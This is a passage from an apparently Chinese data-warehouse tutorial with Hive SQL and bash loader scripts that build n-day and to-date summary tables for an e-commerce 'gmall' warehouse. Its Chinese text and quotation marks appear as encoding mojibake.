${APP}.dws_trade_user_sku_order_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from ${APP}.dws_trade_user_sku_order_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-30)</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><p>â€œ</p><p>dws_trade_user_sku_order_refund_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_refund_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from ${APP}.dws_trade_user_sku_order_refund_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><p>â€œ</p><p>dws_traffic_page_visitor_page_view_nd=â€</p><p>insert overwrite table ${APP}.dws_traffic_page_visitor_page_view_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),during_time_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),view_count_1d,0)),</p><p>sum(during_time_1d),</p><p>sum(view_count_1d)</p><p>from ${APP}.dws_traffic_page_visitor_page_view_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>group by mid_id,brand,model,operate_system,page_id;</p><p>â€œ</p><p>case $1 in</p><p>â€œdws_trade_activity_order_ndâ€ )</p><p>hive -e â€œ$dws_trade_activity_order_ndâ€</p><p>;;</p><p>â€œdws_trade_coupon_order_ndâ€ )</p><p>hive -e â€œ$dws_trade_coupon_order_ndâ€</p><p>;;</p><p>â€œdws_trade_province_order_ndâ€ )</p><p>hive -e â€œ$dws_trade_province_order_ndâ€</p><p>;;</p><p>â€œdws_trade_user_cart_add_ndâ€ )</p><p>hive -e â€œ$dws_trade_user_cart_add_ndâ€</p><p>;;</p><p>â€œdws_trade_user_order_ndâ€ )</p><p>hive -e â€œ$dws_trade_user_order_ndâ€</p><p>;;</p><p>â€œdws_trade_user_order_refund_ndâ€ )</p><p>hive -e â€œ$dws_trade_user_order_refund_ndâ€</p><p>;;</p><p>â€œdws_trade_user_payment_ndâ€ )</p><p>hive -e â€œ$dws_trade_user_payment_ndâ€</p><p>;;</p><p>â€œdws_trade_user_sku_order_ndâ€ )</p><p>hive -e â€œ$dws_trade_user_sku_order_ndâ€</p><p>;;</p><p>â€œdws_trade_user_sku_order_refund_ndâ€ )</p><p>hive -e â€œ$dws_trade_user_sku_order_refund_ndâ€</p><p>;;</p><p>â€œdws_traffic_page_visitor_page_view_ndâ€ )</p><p>hive -e â€œ$dws_traffic_page_visitor_page_view_ndâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dws_trade_activity_order_nd$dws_trade_coupon_order_nd$dws_trade_province_order_nd$dws_trade_user_cart_add_nd$dws_trade_user_order_nd$dws_trade_user_order_refund_nd$dws_trade_user_payment_nd$dws_trade_user_sku_order_nd$dws_trade_user_sku_order_refund_nd$dws_traffic_page_visitor_page_view_ndâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_1d_to_dws_nd.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ dws_1d_to_dws_nd.sh all 2020-06-14</p><h3 id="å†å²è‡³ä»Šæ±‡æ€»è¡¨"><a href="#å†å²è‡³ä»Šæ±‡æ€»è¡¨" class="headerlink" title="å†å²è‡³ä»Šæ±‡æ€»è¡¨"></a>å†å²è‡³ä»Šæ±‡æ€»è¡¨</h3><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•å†å²è‡³ä»Šæ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•å†å²è‡³ä»Šæ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•å†å²è‡³ä»Šæ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•å†å²è‡³ä»Šæ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_td;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_td</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`order_date_first` STRING COMMENT â€˜é¦–æ¬¡ä¸‹å•æ—¥æœŸâ€™,</p><p>`order_date_last` STRING COMMENT â€˜æœ«æ¬¡ä¸‹å•æ—¥æœŸâ€™,</p><p>`order_count_td` BIGINT COMMENT â€˜ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_td` BIGINT COMMENT â€˜è´­ä¹°å•†å“ä»¶æ•°â€™,</p><p>`original_amount_td` DECIMAL(16, 2) COMMENT â€˜åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_td` DECIMAL(16, 2) COMMENT â€˜æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_td` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`total_amount_td` DECIMAL(16, 2) COMMENT â€˜æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•å†å²è‡³ä»Šæ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_order_tdâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_td partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>min(dt) login_date_first,</p><p>max(dt) login_date_last,</p><p>sum(order_count_1d) order_count,</p><p>sum(order_num_1d) order_num,</p><p>sum(order_original_amount_1d) original_amount,</p><p>sum(activity_reduce_amount_1d) activity_reduce_amount,</p><p>sum(coupon_reduce_amount_1d) coupon_reduce_amount,</p><p>sum(order_total_amount_1d) total_amount</p><p>from dws_trade_user_order_1d</p><p>group by user_id;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_td partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is not null and old.user_id is<br>null,â€™2020-06-15â€™,old.order_date_first),</p><p>if(new.user_id is not null,â€™2020-06-15â€™,old.order_date_last),</p><p>nvl(old.order_count_td,0)+nvl(new.order_count_1d,0),</p><p>nvl(old.order_num_td,0)+nvl(new.order_num_1d,0),</p><p>nvl(old.original_amount_td,0)+nvl(new.order_original_amount_1d,0),</p><p>nvl(old.activity_reduce_amount_td,0)+nvl(new.activity_reduce_amount_1d,0),</p><p>nvl(old.coupon_reduce_amount_td,0)+nvl(new.coupon_reduce_amount_1d,0),</p><p>nvl(old.total_amount_td,0)+nvl(new.order_total_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>order_date_first,</p><p>order_date_last,</p><p>order_count_td,</p><p>order_num_td,</p><p>original_amount_td,</p><p>activity_reduce_amount_td,</p><p>coupon_reduce_amount_td,</p><p>total_amount_td</p><p>from dws_trade_user_order_td</p><p>where dt=date_add(â€˜2020-06-15â€™,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from dws_trade_user_order_1d</p><p>where dt=â€™2020-06-15â€™</p><p>)new</p><p>on old.user_id=new.user_id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜å†å²è‡³ä»Šæ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜å†å²è‡³ä»Šæ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜å†å²è‡³ä»Šæ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜å†å²è‡³ä»Šæ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_payment_td;</p><p>CREATE EXTERNAL TABLE dws_trade_user_payment_td</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`payment_date_first` STRING COMMENT â€˜é¦–æ¬¡æ”¯ä»˜æ—¥æœŸâ€™,</p><p>`payment_date_last` STRING COMMENT â€˜æœ«æ¬¡æ”¯ä»˜æ—¥æœŸâ€™,</p><p>`payment_count_td` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥æ”¯ä»˜æ¬¡æ•°â€™,</p><p>`payment_num_td` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥æ”¯ä»˜å•†å“ä»¶æ•°â€™,</p><p>`payment_amount_td` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥æ”¯ä»˜é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜å†å²è‡³ä»Šæ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_payment_tdâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_payment_td partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>min(dt) payment_date_first,</p><p>max(dt) payment_date_last,</p><p>sum(payment_count_1d) payment_count,</p><p>sum(payment_num_1d) payment_num,</p><p>sum(payment_amount_1d) payment_amount</p><p>from dws_trade_user_payment_1d</p><p>group by user_id;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_payment_td partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(old.user_id is null and new.user_id is not<br>null,â€™2020-06-15â€™,old.payment_date_first),</p><p>if(new.user_id is not null,â€™2020-06-15â€™,old.payment_date_last),</p><p>nvl(old.payment_count_td,0)+nvl(new.payment_count_1d,0),</p><p>nvl(old.payment_num_td,0)+nvl(new.payment_num_1d,0),</p><p>nvl(old.payment_amount_td,0)+nvl(new.payment_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>payment_date_first,</p><p>payment_date_last,</p><p>payment_count_td,</p><p>payment_num_td,</p><p>payment_amount_td</p><p>from dws_trade_user_payment_td</p><p>where dt=date_add(â€˜2020-06-15â€™,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>payment_count_1d,</p><p>payment_num_1d,</p><p>payment_amount_1d</p><p>from dws_trade_user_payment_1d</p><p>where dt=â€™2020-06-15â€™</p><p>)new</p><p>on old.user_id=new.user_id;</p><h4 id="ç”¨æˆ·åŸŸç”¨æˆ·ç²’åº¦ç™»å½•å†å²è‡³ä»Šæ±‡æ€»è¡¨"><a href="#ç”¨æˆ·åŸŸç”¨æˆ·ç²’åº¦ç™»å½•å†å²è‡³ä»Šæ±‡æ€»è¡¨" class="headerlink" title="ç”¨æˆ·åŸŸç”¨æˆ·ç²’åº¦ç™»å½•å†å²è‡³ä»Šæ±‡æ€»è¡¨"></a>ç”¨æˆ·åŸŸç”¨æˆ·ç²’åº¦ç™»å½•å†å²è‡³ä»Šæ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_user_user_login_td;</p><p>CREATE EXTERNAL TABLE dws_user_user_login_td</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`login_date_last` STRING COMMENT â€˜æœ«æ¬¡ç™»å½•æ—¥æœŸâ€™,</p><p>`login_count_td` BIGINT COMMENT â€˜ç´¯è®¡ç™»å½•æ¬¡æ•°â€™</p><p>) COMMENT â€˜ç”¨æˆ·åŸŸç”¨æˆ·ç²’åº¦ç™»å½•å†å²è‡³ä»Šæ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_user_user_login_tdâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dws_user_user_login_td partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>u.id,</p><p>nvl(login_date_last,date_format(create_time,â€™yyyy-MM-ddâ€™)),</p><p>nvl(login_count_td,1)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>create_time</p><p>from dim_user_zip</p><p>where dt=â€™9999-12-31â€™</p><p>)u</p><p>left join</p><p>(</p><p>select</p><p>user_id,</p><p>max(dt) login_date_last,</p><p>count(*) login_count_td</p><p>from dwd_user_login_inc</p><p>group by user_id</p><p>)l</p><p>on u.id=l.user_id;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_user_user_login_td partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is null,old.login_date_last,â€™2020-06-15â€™),</p><p>nvl(old.login_count_td,0)+nvl(new.login_count_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last,</p><p>login_count_td</p><p>from dws_user_user_login_td</p><p>where dt=date_add(â€˜2020-06-15â€™,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>count(*) login_count_1d</p><p>from dwd_user_login_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id</p><p>)new</p><p>on old.user_id=new.user_id;</p><h4 id="æ•°æ®è£…è½½è„šæœ¬-5"><a href="#æ•°æ®è£…è½½è„šæœ¬-5" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h4><p><strong>1ï¼‰é¦–æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºdws_1d_to_dws_td_init.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_1d_to_dws_td_init.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>echo â€œè¯·ä¼ å…¥æ—¥æœŸå‚æ•°â€</p><p>exit</p><p>fi</p><p>dws_trade_user_order_td=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_td partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>min(dt) login_date_first,</p><p>max(dt) login_date_last,</p><p>sum(order_count_1d) order_count,</p><p>sum(order_num_1d) order_num,</p><p>sum(order_original_amount_1d) original_amount,</p><p>sum(activity_reduce_amount_1d) activity_reduce_amount,</p><p>sum(coupon_reduce_amount_1d) coupon_reduce_amount,</p><p>sum(order_total_amount_1d) total_amount</p><p>from ${APP}.dws_trade_user_order_1d</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_payment_td=â€</p><p>insert overwrite table ${APP}.dws_trade_user_payment_td<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>min(dt) payment_date_first,</p><p>max(dt) payment_date_last,</p><p>sum(payment_count_1d) payment_count,</p><p>sum(payment_num_1d) payment_num,</p><p>sum(payment_amount_1d) payment_amount</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>group by user_id;</p><p>â€œ</p><p>dws_user_user_login_td=â€</p><p>insert overwrite table ${APP}.dws_user_user_login_td partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>u.id,</p><p>nvl(login_date_last,date_format(create_time,â€™yyyy-MM-ddâ€™)),</p><p>nvl(login_count_td,1)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>create_time</p><p>from ${APP}.dim_user_zip</p><p>where dt=â€™9999-12-31â€™</p><p>)u</p><p>left join</p><p>(</p><p>select</p><p>user_id,</p><p>max(dt) login_date_last,</p><p>count(*) login_count_td</p><p>from ${APP}.dwd_user_login_inc</p><p>group by user_id</p><p>)l</p><p>on u.id=l.user_id;</p><p>â€œ</p><p>case $1 in</p><p>â€œdws_trade_user_order_tdâ€ )</p><p>hive -e â€œ$dws_trade_user_order_tdâ€</p><p>;;</p><p>â€œdws_trade_user_payment_tdâ€ )</p><p>hive -e â€œ$dws_trade_user_payment_tdâ€</p><p>;;</p><p>â€œdws_user_user_login_tdâ€ )</p><p>hive -e â€œ$dws_user_user_login_tdâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dws_trade_user_order_td$dws_trade_user_payment_td$dws_user_user_login_tdâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_1d_to_dws_td_init.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ dws_1d_to_dws_td_init.sh all 2020-06-14</p><p><strong>2ï¼‰æ¯æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºdws_1d_to_dws_td.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_1d_to_dws_td.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## å¦‚æœè¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>dws_trade_user_order_td=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_td partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is not null and old.user_id is<br>null,â€™$do_dateâ€™,old.order_date_first),</p><p>if(new.user_id is not null,â€™$do_dateâ€™,old.order_date_last),</p><p>nvl(old.order_count_td,0)+nvl(new.order_count_1d,0),</p><p>nvl(old.order_num_td,0)+nvl(new.order_num_1d,0),</p><p>nvl(old.original_amount_td,0)+nvl(new.order_original_amount_1d,0),</p><p>nvl(old.activity_reduce_amount_td,0)+nvl(new.activity_reduce_amount_1d,0),</p><p>nvl(old.coupon_reduce_amount_td,0)+nvl(new.coupon_reduce_amount_1d,0),</p><p>nvl(old.total_amount_td,0)+nvl(new.order_total_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>order_date_first,</p><p>order_date_last,</p><p>order_count_td,</p><p>order_num_td,</p><p>original_amount_td,</p><p>activity_reduce_amount_td,</p><p>coupon_reduce_amount_td,</p><p>total_amount_td</p><p>from ${APP}.dws_trade_user_order_td</p><p>where dt=date_add(â€˜$do_dateâ€™,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt=â€™$do_dateâ€™</p><p>)new</p><p>on old.user_id=new.user_id;</p><p>â€œ</p><p>dws_trade_user_payment_td=â€</p><p>insert overwrite table ${APP}.dws_trade_user_payment_td<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(old.user_id is null and new.user_id is not<br>null,â€™$do_dateâ€™,old.payment_date_first),</p><p>if(new.user_id is not null,â€™$do_dateâ€™,old.payment_date_last),</p><p>nvl(old.payment_count_td,0)+nvl(new.payment_count_1d,0),</p><p>nvl(old.payment_num_td,0)+nvl(new.payment_num_1d,0),</p><p>nvl(old.payment_amount_td,0)+nvl(new.payment_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>payment_date_first,</p><p>payment_date_last,</p><p>payment_count_td,</p><p>payment_num_td,</p><p>payment_amount_td</p><p>from ${APP}.dws_trade_user_payment_td</p><p>where dt=date_add(â€˜$do_dateâ€™,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>payment_count_1d,</p><p>payment_num_1d,</p><p>payment_amount_1d</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>where dt=â€™$do_dateâ€™</p><p>)new</p><p>on old.user_id=new.user_id;</p><p>â€œ</p><p>dws_user_user_login_td=â€</p><p>insert overwrite table ${APP}.dws_user_user_login_td partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is null,old.login_date_last,â€™$do_dateâ€™),</p><p>nvl(old.login_count_td,0)+nvl(new.login_count_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last,</p><p>login_count_td</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=date_add(â€˜$do_dateâ€™,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>count(*) login_count_1d</p><p>from ${APP}.dwd_user_login_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id</p><p>)new</p><p>on old.user_id=new.user_id;</p><p>â€œ</p><p>case $1 in</p><p>â€œdws_trade_user_order_tdâ€ )</p><p>hive -e â€œ$dws_trade_user_order_tdâ€</p><p>;;</p><p>â€œdws_trade_user_payment_tdâ€ )</p><p>hive -e â€œ$dws_trade_user_payment_tdâ€</p><p>;;</p><p>â€œdws_user_user_login_tdâ€ )</p><p>hive -e â€œ$dws_user_user_login_tdâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dws_trade_user_order_td$dws_trade_user_payment_td$dws_user_user_login_tdâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_1d_to_dws_td.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ dws_1d_to_dws_td.sh all 2020-06-14</p><h2 id="ç¬¬11ç« -æ•°ä»“å¼€å‘ä¹‹ADSå±‚"><a href="#ç¬¬11ç« -æ•°ä»“å¼€å‘ä¹‹ADSå±‚" class="headerlink" title="ç¬¬11ç«  æ•°ä»“å¼€å‘ä¹‹ADSå±‚"></a>ç¬¬11ç«  æ•°ä»“å¼€å‘ä¹‹ADSå±‚</h2><h3 id="æµé‡ä¸»é¢˜"><a href="#æµé‡ä¸»é¢˜" class="headerlink" title="æµé‡ä¸»é¢˜"></a>æµé‡ä¸»é¢˜</h3><h4 id="å„æ¸ é“æµé‡ç»Ÿè®¡"><a href="#å„æ¸ é“æµé‡ç»Ÿè®¡" class="headerlink" title="å„æ¸ é“æµé‡ç»Ÿè®¡"></a>å„æ¸ é“æµé‡ç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1/7/30æ—¥</td><td>æ¸ é“</td><td>è®¿å®¢æ•°</td><td>ç»Ÿè®¡è®¿é—®äººæ•°</td></tr><tr><td>æœ€è¿‘1/7/30æ—¥</td><td>æ¸ é“</td><td>ä¼šè¯å¹³å‡åœç•™æ—¶é•¿</td><td>ç»Ÿè®¡æ¯ä¸ªä¼šè¯å¹³å‡åœç•™æ—¶é•¿</td></tr><tr><td>æœ€è¿‘1/7/30æ—¥</td><td>æ¸ é“</td><td>ä¼šè¯å¹³å‡æµè§ˆé¡µé¢æ•°</td><td>ç»Ÿè®¡æ¯ä¸ªä¼šè¯å¹³å‡æµè§ˆé¡µé¢æ•°</td></tr><tr><td>æœ€è¿‘1/7/30æ—¥</td><td>æ¸ é“</td><td>ä¼šè¯æ€»æ•°</td><td>ç»Ÿè®¡ä¼šè¯æ€»æ•°</td></tr><tr><td>æœ€è¿‘1/7/30æ—¥</td><td>æ¸ é“</td><td>è·³å‡ºç‡</td><td>åªæœ‰ä¸€ä¸ªé¡µé¢çš„ä¼šè¯çš„æ¯”ä¾‹</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_traffic_stats_by_channel;</p><p>CREATE EXTERNAL TABLE ads_traffic_stats_by_channel</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`channel` STRING COMMENT â€˜æ¸ é“â€™,</p><p>`uv_count` BIGINT COMMENT â€˜è®¿å®¢äººæ•°â€™,</p><p>`avg_duration_sec` BIGINT COMMENT â€˜ä¼šè¯å¹³å‡åœç•™æ—¶é•¿ï¼Œå•ä½ä¸ºç§’â€™,</p><p>`avg_page_count` BIGINT COMMENT â€˜ä¼šè¯å¹³å‡æµè§ˆé¡µé¢æ•°â€™,</p><p>`sv_count` BIGINT COMMENT â€˜ä¼šè¯æ•°â€™,</p><p>`bounce_rate` DECIMAL(16, 2) COMMENT â€˜è·³å‡ºç‡â€™</p><p>) COMMENT â€˜å„æ¸ é“æµé‡ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_traffic_stats_by_channel/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_traffic_stats_by_channel</p><p>select * from ads_traffic_stats_by_channel</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>recent_days,</p><p>channel,</p><p>cast(count(distinct(mid_id)) as bigint) uv_count,</p><p>cast(avg(during_time_1d)/1000 as bigint) avg_duration_sec,</p><p>cast(avg(page_count_1d) as bigint) avg_page_count,</p><p>cast(count(*) as bigint) 